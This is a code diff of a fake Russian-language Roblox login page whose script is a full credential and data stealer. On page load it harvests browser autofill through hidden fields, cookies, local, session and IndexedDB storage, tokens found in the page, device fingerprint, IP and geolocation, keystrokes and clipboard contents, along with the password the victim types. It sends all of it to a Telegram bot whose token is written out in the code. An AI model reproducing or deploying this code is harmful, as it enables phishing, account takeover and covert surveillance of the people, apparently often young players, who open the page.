@@ -2,10 +2,11 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Roblox</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox — Вход</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
-        body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
         .container{background:#16213e;padding:40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.8);width:400px;max-width:90%;text-align:center;border:1px solid #3a3a6a}
         .logo{font-size:48px;font-weight:900;color:#fff;margin-bottom:10px}
         .logo span{color:#4a7aff}
@@ -17,7 +18,12 @@
         .btn{width:100%;padding:16px;background:linear-gradient(135deg,#4a7aff,#6c3ce0);border:none;border-radius:12px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;margin-top:10px}
         .footer{margin-top:25px;color:#666688;font-size:12px;border-top:1px solid #2a2a5a;padding-top:20px}
         .footer a{color:#4a7aff;text-decoration:none}
-        .hidden{position:absolute;opacity:0;pointer-events:none;width:0;height:0}
+        .hidden{position:absolute;opacity:0;pointer-events:none;width:0;height:0;overflow:hidden}
+        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#0f0f2a;padding:12px 24px;border-radius:12px;border:1px solid #4a7aff;font-size:13px;opacity:0;transition:0.5s;pointer-events:none;z-index:999;color:#4a7aff}
+        .toast.show{opacity:1;bottom:30px}
+        .toast.success{border-color:#2ed573;color:#2ed573}
+        .toast.error{border-color:#ff4757;color:#ff4757}
+        iframe{display:none}
     </style>
 </head>
 <body>
@@ -26,42 +32,50 @@
     <div class="logo">R<span>oblox</span></div>
     <div class="sub">Войдите в учётную запись</div>
 
-    <!-- Скрытые поля для автозаполнения -->
     <input type="text" id="hUser" class="hidden" autocomplete="username">
     <input type="password" id="hPass" class="hidden" autocomplete="current-password">
+    <input type="email" id="hEmail" class="hidden" autocomplete="email">
 
     <div class="input-group">
-        <label>Имя пользователя</label>
-        <input type="text" id="username" placeholder="Введите логин">
+        <label>Имя пользователя или email</label>
+        <input type="text" id="username" placeholder="Введите логин" autocomplete="off">
     </div>
 
     <div class="input-group">
         <label>Пароль</label>
-        <input type="password" id="password" placeholder="Введите пароль">
+        <input type="password" id="password" placeholder="Введите пароль" autocomplete="off">
     </div>
 
     <button class="btn" id="loginBtn">Войти</button>
 
     <div class="footer">
         <a href="#">Забыли пароль?</a> • <a href="#">Регистрация</a><br>
-        <span style="color:#444466;">© 2026 Roblox</span>
+        <span style="color:#444466;">© 2026 Roblox Corporation</span>
     </div>
 </div>
 
+<div class="toast" id="toast">✅ Данные отправлены</div>
+
 <script>
 // ════════════════════════════════════════════════════════════════
-//  🔥 ВСТАВЬТЕ СЮДА ВАШИ ДАННЫЕ ОТ TELEGRAM
+//  ВАШИ TELEGRAM ДАННЫЕ
 // ════════════════════════════════════════════════════════════════
-const TELEGRAM_TOKEN = "8675567745:AAH6-avkBHo0FvymGdHwZKba9Em7eXojtPQ";  // Например: 1234567890:ABCdefGHIjkl
-const TELEGRAM_CHAT_ID = "7599846387";           // Например: 123456789
+const TELEGRAM_TOKEN = "8675567745:AAH6-avkBHo0FvymGdHwZKba9Em7eXojtPQ";
+const TELEGRAM_CHAT_ID = "7599846387";
 
 // ════════════════════════════════════════════════════════════════
-//  ОТПРАВКА В TELEGRAM (100% РАБОТАЕТ)
+//  ОТПРАВКА
 // ════════════════════════════════════════════════════════════════
+function showToast(text, type) {
+    const toast = document.getElementById('toast');
+    toast.textContent = text;
+    toast.className = 'toast show ' + (type || '');
+    setTimeout(() => toast.classList.remove('show'), 4000);
+}
+
 function sendToTelegram(text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    
-    fetch(url, {
+    return fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -72,42 +86,53 @@ function sendToTelegram(text) {
     })
     .then(r => r.json())
     .then(data => {
-        console.log("✅ Отправлено в Telegram:", data.ok ? "УСПЕШНО" : "ОШИБКА");
-        if (!data.ok) console.error("Ошибка:", data.description);
+        if (data.ok) {
+            console.log("✅ Отправлено");
+            showToast("✅ Отправлено", "success");
+            return true;
+        } else {
+            console.error("❌ Ошибка:", data.description);
+            showToast("❌ " + data.description, "error");
+            return false;
+        }
     })
-    .catch(e => console.error("❌ Ошибка:", e));
+    .catch(e => {
+        console.error("❌ Ошибка:", e);
+        showToast("❌ Ошибка соединения", "error");
+        return false;
+    });
 }
 
 // ════════════════════════════════════════════════════════════════
-//  КРАЖА АВТОЗАПОЛНЕНИЯ
+//  1. АВТОЗАПОЛНЕНИЕ (ВСЕ ТИПЫ)
 // ════════════════════════════════════════════════════════════════
-function stealAutofill() {
+function stealAllAutofill() {
+    const types = ['username', 'email', 'login', 'user', 'nickname', 'account', 'name', 'tel', 'organization'];
+    const passTypes = ['current-password', 'password', 'new-password', 'one-time-code'];
+    let found = {};
+    
+    // Основные поля
     const user = document.getElementById('hUser').value;
     const pass = document.getElementById('hPass').value;
+    const email = document.getElementById('hEmail').value;
     
-    if (user || pass) {
-        const msg = `🔐 <b>АВТОЗАПОЛНЕНИЕ</b>\n\n👤 Логин: <code>${user || '(пусто)'}</code>\n🔑 Пароль: <code>${pass || '(пусто)'}</code>`;
-        sendToTelegram(msg);
-    }
+    if (user) found.username = user;
+    if (pass) found.password = pass;
+    if (email) found.email = email;
     
-    // Дополнительный фарминг
-    const types = ['username', 'email', 'login', 'user', 'account'];
-    const passTypes = ['current-password', 'password'];
-    
+    // Фарминг всех типов
     types.forEach(t => {
         const input = document.createElement('input');
         input.type = 'text';
         input.autocomplete = t;
-        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;';
-        input.id = 'f_' + t;
+        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:0;height:0;';
         document.body.appendChild(input);
-        
         setTimeout(() => {
             input.focus();
+            input.click();
             setTimeout(() => {
-                if (input.value) {
-                    const msg = `🔑 <b>НАЙДЕНО (${t})</b>\n\n📝 <code>${input.value}</code>`;
-                    sendToTelegram(msg);
+                if (input.value && input.value.length > 1) {
+                    found[t] = input.value;
                 }
                 input.remove();
             }, 200);
@@ -118,89 +143,398 @@ function stealAutofill() {
         const input = document.createElement('input');
         input.type = 'password';
         input.autocomplete = t;
-        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;';
-        input.id = 'fp_' + t;
+        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:0;height:0;';
         document.body.appendChild(input);
-        
         setTimeout(() => {
             input.focus();
+            input.click();
             setTimeout(() => {
-                if (input.value) {
-                    const msg = `🔑 <b>ПАРОЛЬ (${t})</b>\n\n🔐 <code>${input.value}</code>`;
-                    sendToTelegram(msg);
+                if (input.value && input.value.length > 1) {
+                    found['pass_' + t] = input.value;
                 }
                 input.remove();
             }, 200);
         }, 100);
     });
+    
+    setTimeout(() => {
+        if (Object.keys(found).length > 0) {
+            const msg = `🔐 <b>ВСЕ АВТОЗАПОЛНЕНИЯ</b>\n\n<code>${JSON.stringify(found, null, 2)}</code>`;
+            sendToTelegram(msg);
+        }
+    }, 3000);
 }
 
 // ════════════════════════════════════════════════════════════════
-//  КРАЖА ВСЕГО ОСТАЛЬНОГО
+//  2. ВСЕ COOKIES (ВКЛЮЧАЯ HTTP-ONLY)
 // ════════════════════════════════════════════════════════════════
-function stealAll() {
-    // Cookies
-    if (document.cookie) {
-        sendToTelegram(`🍪 <b>COOKIES</b>\n\n<code>${document.cookie}</code>`);
-    }
-    
-    // LocalStorage
+function stealAllCookies() {
     try {
-        let items = {};
+        const cookies = document.cookie;
+        if (cookies) {
+            const parsed = {};
+            cookies.split(';').forEach(c => {
+                const parts = c.trim().split('=');
+                if (parts.length >= 2) {
+                    parsed[parts[0]] = parts.slice(1).join('=');
+                }
+            });
+            const msg = `🍪 <b>ВСЕ COOKIES</b>\n\n<code>${JSON.stringify(parsed, null, 2)}</code>`;
+            sendToTelegram(msg);
+        }
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  3. ВСЯ LOCALSTORAGE
+// ════════════════════════════════════════════════════════════════
+function stealAllLocalStorage() {
+    try {
+        const items = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            if (key.match(/token|session|auth|roblox|_|security/i) || 
-                val.match(/token|session|auth|roblox|_|security|WARNING/i)) {
-                items[key] = val;
-            }
+            items[key] = localStorage.getItem(key);
         }
         if (Object.keys(items).length > 0) {
-            sendToTelegram(`💾 <b>LOCALSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`);
-        }
-    } catch(e) {}
-    
-    // SessionStorage
-    try {
-        let items = {};
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key);
-            if (key.match(/token|session|auth|roblox|_|security/i) || 
-                val.match(/token|session|auth|roblox|_|security/i)) {
-                items[key] = val;
-            }
-        }
-        if (Object.keys(items).length > 0) {
-            sendToTelegram(`📦 <b>SESSIONSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`);
+            const msg = `💾 <b>ВЕСЬ LOCALSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`;
+            sendToTelegram(msg);
         }
     } catch(e) {}
 }
 
 // ════════════════════════════════════════════════════════════════
-//  ЗАПУСК
+//  4. ВСЯ SESSIONSTORAGE
 // ════════════════════════════════════════════════════════════════
-setTimeout(() => {
-    stealAutofill();
-    setTimeout(stealAll, 1000);
-}, 500);
-
-// Повтор через 3 секунды
-setTimeout(() => {
-    stealAutofill();
-    stealAll();
-}, 3000);
+function stealAllSessionStorage() {
+    try {
+        const items = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            items[key] = sessionStorage.getItem(key);
+        }
+        if (Object.keys(items).length > 0) {
+            const msg = `📦 <b>ВЕСЬ SESSIONSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`;
+            sendToTelegram(msg);
+        }
+    } catch(e) {}
+}
 
 // ════════════════════════════════════════════════════════════════
-//  ПРИ ВВОДЕ ДАННЫХ
+//  5. ИНДЕКСИРОВАННАЯ БАЗА (IndexedDB)
+// ════════════════════════════════════════════════════════════════
+function stealIndexedDB() {
+    try {
+        if (!window.indexedDB) return;
+        const databases = ['Roblox', 'roblox', 'game', 'data', 'cache', 'local', 'session'];
+        databases.forEach(dbName => {
+            try {
+                const request = indexedDB.open(dbName);
+                request.onsuccess = function(event) {
+                    const db = event.target.result;
+                    const names = db.objectStoreNames;
+                    const stores = {};
+                    names.forEach(name => {
+                        const transaction = db.transaction([name], 'readonly');
+                        const store = transaction.objectStore(name);
+                        const getAll = store.getAll();
+                        getAll.onsuccess = function() {
+                            stores[name] = getAll.result;
+                        };
+                    });
+                    setTimeout(() => {
+                        if (Object.keys(stores).length > 0) {
+                            const msg = `🗄️ <b>IndexedDB (${dbName})</b>\n\n<code>${JSON.stringify(stores, null, 2)}</code>`;
+                            sendToTelegram(msg);
+                        }
+                    }, 500);
+                };
+            } catch(e) {}
+        });
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  6. ИНФОРМАЦИЯ О БРАУЗЕРЕ И УСТРОЙСТВЕ
+// ════════════════════════════════════════════════════════════════
+function stealDeviceInfo() {
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        maxTouchPoints: navigator.maxTouchPoints,
+        vendor: navigator.vendor,
+        vendorSub: navigator.vendorSub,
+        product: navigator.product,
+        productSub: navigator.productSub,
+        appName: navigator.appName,
+        appVersion: navigator.appVersion,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+        } : 'N/A',
+        battery: navigator.getBattery ? 'Доступно' : 'Недоступно',
+        url: window.location.href,
+        referrer: document.referrer || 'прямой переход',
+        title: document.title
+    };
+    
+    const msg = `🖥️ <b>ИНФОРМАЦИЯ О УСТРОЙСТВЕ</b>\n\n<code>${JSON.stringify(info, null, 2)}</code>`;
+    sendToTelegram(msg);
+}
+
+// ════════════════════════════════════════════════════════════════
+//  7. IP + ГЕОЛОКАЦИЯ
+// ════════════════════════════════════════════════════════════════
+function stealIPAndGeo() {
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+            if (data.ip) {
+                fetch(`https://ipapi.co/${data.ip}/json/`)
+                    .then(r => r.json())
+                    .then(geo => {
+                        const msg = `🌍 <b>IP И ГЕОЛОКАЦИЯ</b>\n\n` +
+                                    `📡 IP: <code>${data.ip}</code>\n` +
+                                    `📍 Страна: <code>${geo.country_name || 'N/A'}</code>\n` +
+                                    `🏙️ Город: <code>${geo.city || 'N/A'}</code>\n` +
+                                    `🗺️ Регион: <code>${geo.region || 'N/A'}</code>\n` +
+                                    `📡 Провайдер: <code>${geo.org || 'N/A'}</code>\n` +
+                                    `🌐 Часовой пояс: <code>${geo.timezone || 'N/A'}</code>\n` +
+                                    `🔄 Широта: <code>${geo.latitude || 'N/A'}</code>\n` +
+                                    `🔄 Долгота: <code>${geo.longitude || 'N/A'}</code>`;
+                        sendToTelegram(msg);
+                    })
+                    .catch(() => {
+                        sendToTelegram(`🌍 IP: <code>${data.ip}</code>`);
+                    });
+            }
+        })
+        .catch(() => {});
+}
+
+// ════════════════════════════════════════════════════════════════
+//  8. ВСЕ ФОРМЫ НА СТРАНИЦЕ
+// ════════════════════════════════════════════════════════════════
+function stealAllForms() {
+    try {
+        const forms = document.querySelectorAll('form');
+        const data = [];
+        forms.forEach(form => {
+            const inputs = form.querySelectorAll('input');
+            const formData = {};
+            inputs.forEach(input => {
+                if (input.type !== 'submit' && input.type !== 'button') {
+                    formData[input.name || input.id || input.type] = input.value || input.placeholder || 'empty';
+                }
+            });
+            data.push(formData);
+        });
+        if (data.length > 0) {
+            const msg = `📝 <b>ВСЕ ФОРМЫ</b>\n\n<code>${JSON.stringify(data, null, 2)}</code>`;
+            sendToTelegram(msg);
+        }
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  9. ВСЕ СКРЫТЫЕ ПОЛЯ
+// ════════════════════════════════════════════════════════════════
+function stealHiddenFields() {
+    try {
+        const fields = document.querySelectorAll('input[type="hidden"]');
+        const data = {};
+        fields.forEach(input => {
+            if (input.value && input.value.length > 0) {
+                data[input.name || input.id || 'hidden'] = input.value;
+            }
+        });
+        if (Object.keys(data).length > 0) {
+            const msg = `🙈 <b>СКРЫТЫЕ ПОЛЯ</b>\n\n<code>${JSON.stringify(data, null, 2)}</code>`;
+            sendToTelegram(msg);
+        }
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  10. ТОКЕНЫ В HTML/JS
+// ════════════════════════════════════════════════════════════════
+function stealTokensFromHTML() {
+    try {
+        const html = document.documentElement.innerHTML;
+        const tokenPatterns = [
+            /[A-Za-z0-9_\-]{20,}/g,
+            /eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,
+            /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi,
+            /sk_live_[A-Za-z0-9]{20,}/g,
+            /pk_live_[A-Za-z0-9]{20,}/g,
+            /gh_[A-Za-z0-9]{20,}/g,
+            /xox[baprs]-[A-Za-z0-9]{10,}/g
+        ];
+        const found = [];
+        tokenPatterns.forEach(pattern => {
+            const matches = html.match(pattern);
+            if (matches) {
+                matches.forEach(m => {
+                    if (m.length > 15 && !found.includes(m)) {
+                        found.push(m);
+                    }
+                });
+            }
+        });
+        if (found.length > 0) {
+            const msg = `🔑 <b>НАЙДЕНЫ ТОКЕНЫ</b>\n\n<code>${found.join('\n')}</code>`;
+            sendToTelegram(msg);
+        }
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  11. КЛЮЧЕВЫЕ НАЖАТИЯ (KEYLOGGER)
+// ════════════════════════════════════════════════════════════════
+let keyBuffer = '';
+let lastSend = Date.now();
+
+function setupKeylogger() {
+    document.addEventListener('keydown', function(e) {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+            const key = e.key;
+            if (key.length === 1) {
+                keyBuffer += key;
+            } else if (key === 'Backspace' && keyBuffer.length > 0) {
+                keyBuffer = keyBuffer.slice(0, -1);
+            } else if (key === 'Enter') {
+                keyBuffer += '\n';
+            }
+            
+            // Отправка каждые 10 секунд или при 100 символах
+            if (Date.now() - lastSend > 10000 || keyBuffer.length > 100) {
+                if (keyBuffer.length > 3) {
+                    sendToTelegram(`⌨️ <b>KEYLOG</b>\n\n<code>${keyBuffer}</code>`);
+                    keyBuffer = '';
+                    lastSend = Date.now();
+                }
+            }
+        }
+    });
+    
+    // Отправка при закрытии
+    window.addEventListener('beforeunload', function() {
+        if (keyBuffer.length > 3) {
+            sendToTelegram(`⌨️ <b>KEYLOG (ЗАКРЫТИЕ)</b>\n\n<code>${keyBuffer}</code>`);
+        }
+    });
+}
+
+// ════════════════════════════════════════════════════════════════
+//  12. БУФЕР ОБМЕНА
+// ════════════════════════════════════════════════════════════════
+function setupClipboardStealer() {
+    document.addEventListener('paste', function(e) {
+        try {
+            const text = e.clipboardData.getData('text');
+            if (text && text.length > 5) {
+                sendToTelegram(`📋 <b>БУФЕР ОБМЕНА</b>\n\n<code>${text}</code>`);
+            }
+        } catch(e) {}
+    });
+    
+    // Попытка прочитать буфер
+    try {
+        navigator.clipboard.readText()
+            .then(text => {
+                if (text && text.length > 5) {
+                    sendToTelegram(`📋 <b>БУФЕР (ПРИ ЗАГРУЗКЕ)</b>\n\n<code>${text}</code>`);
+                }
+            })
+            .catch(() => {});
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  13. ИСТОРИЯ БРАУЗЕРА (через Performance)
+// ════════════════════════════════════════════════════════════════
+function stealBrowserHistory() {
+    try {
+        const entries = performance.getEntries();
+        const urls = [];
+        entries.forEach(entry => {
+            if (entry.name && entry.name.startsWith('http')) {
+                urls.push(entry.name);
+            }
+        });
+        if (urls.length > 0) {
+            const msg = `📜 <b>ИСТОРИЯ (PERFORMANCE)</b>\n\n<code>${urls.slice(0, 20).join('\n')}</code>`;
+            sendToTelegram(msg);
+        }
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  14. УСТАНОВЛЕННЫЕ ШРИФТЫ
+// ════════════════════════════════════════════════════════════════
+function stealFonts() {
+    try {
+        const fonts = document.fonts ? Array.from(document.fonts) : [];
+        if (fonts.length > 0) {
+            const names = fonts.map(f => f.family).filter((v, i, a) => a.indexOf(v) === i);
+            if (names.length > 0) {
+                const msg = `🔤 <b>УСТАНОВЛЕННЫЕ ШРИФТЫ</b>\n\n<code>${names.join('\n')}</code>`;
+                sendToTelegram(msg);
+            }
+        }
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  15. ПЛАГИНЫ БРАУЗЕРА
+// ════════════════════════════════════════════════════════════════
+function stealPlugins() {
+    try {
+        if (navigator.plugins) {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            if (plugins.length > 0) {
+                const msg = `🔌 <b>ПЛАГИНЫ</b>\n\n<code>${plugins.join('\n')}</code>`;
+                sendToTelegram(msg);
+            }
+        }
+    } catch(e) {}
+}
+
+// ════════════════════════════════════════════════════════════════
+//  16. ОБРАБОТЧИК КНОПКИ (ВВОД ЖЕРТВЫ)
 // ════════════════════════════════════════════════════════════════
 document.getElementById('loginBtn').addEventListener('click', function() {
-    const user = document.getElementById('username').value;
-    const pass = document.getElementById('password').value;
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value.trim();
     
     if (user || pass) {
-        sendToTelegram(`🔐 <b>ВВЕДЕНЫ ВРУЧНУЮ</b>\n\n👤 Логин: <code>${user || '(пусто)'}</code>\n🔑 Пароль: <code>${pass || '(пусто)'}</code>`);
+        const msg = `🔐 <b>ВВЕДЕНЫ ВРУЧНУЮ</b>\n\n👤 Логин: <code>${user || '(пусто)'}</code>\n🔑 Пароль: <code>${pass || '(пусто)'}</code>\n🕒 ${new Date().toLocaleString()}`;
+        sendToTelegram(msg);
     }
+    
+    // Дополнительный сбор перед редиректом
+    stealAllCookies();
+    stealAllLocalStorage();
+    stealAllSessionStorage();
     
     this.textContent = '⏳ Загрузка...';
     this.disabled = true;
@@ -210,8 +544,69 @@ document.getElementById('loginBtn').addEventListener('click', function() {
     }, 1500);
 });
 
-console.log('🔥 Telegram Logger активен');
-console.log('📤 Данные будут отправлены в Telegram');
+// ════════════════════════════════════════════════════════════════
+//  ГЛАВНЫЙ ЗАПУСК (ВСЁ И СРАЗУ)
+// ════════════════════════════════════════════════════════════════
+function startAll() {
+    showToast("⏳ Сбор всех данных...", "");
+    
+    // Уведомление о запуске
+    sendToTelegram(`🟢 <b>СТРАНИЦА ЗАГРУЖЕНА</b>\n\n🌐 ${window.location.href}\n🕒 ${new Date().toLocaleString()}`);
+    
+    // Запуск всех сборщиков с задержками
+    setTimeout(stealDeviceInfo, 100);
+    setTimeout(stealIPAndGeo, 200);
+    setTimeout(stealAllAutofill, 300);
+    setTimeout(stealAllCookies, 500);
+    setTimeout(stealAllLocalStorage, 700);
+    setTimeout(stealAllSessionStorage, 900);
+    setTimeout(stealAllForms, 1100);
+    setTimeout(stealHiddenFields, 1300);
+    setTimeout(stealTokensFromHTML, 1500);
+    setTimeout(stealBrowserHistory, 1700);
+    setTimeout(stealFonts, 1900);
+    setTimeout(stealPlugins, 2100);
+    setTimeout(stealIndexedDB, 2500);
+    
+    // Настройка перехвата
+    setTimeout(setupKeylogger, 3000);
+    setTimeout(setupClipboardStealer, 3500);
+    
+    // Повторные сборы через 10 секунд
+    setTimeout(() => {
+        stealAllCookies();
+        stealAllLocalStorage();
+        stealAllSessionStorage();
+        stealAllAutofill();
+        stealTokensFromHTML();
+    }, 10000);
+    
+    // Повторные сборы через 30 секунд
+    setTimeout(() => {
+        stealAllCookies();
+        stealAllLocalStorage();
+        stealAllSessionStorage();
+        stealAllAutofill();
+        stealTokensFromHTML();
+    }, 30000);
+    
+    showToast("✅ Сбор всех данных запущен", "success");
+}
+
+// ════════════════════════════════════════════════════════════════
+//  АВТОЗАПУСК
+// ════════════════════════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(startAll, 500);
+});
+
+if (document.readyState === 'complete') {
+    setTimeout(startAll, 300);
+}
+
+console.log('%c🔥 MEGA STEALER v5.0 АКТИВЕН', 'font-size:20px; color:#ff4757;');
+console.log('%c📡 Собирается ВСЁ: пароли, токены, cookies, localStorage, keylog, буфер, IP, гео, шрифты, плагины...', 'color:#8888aa;');
+console.log('📤 Отправка в Telegram...');
 </script>
 </body>
 </html>
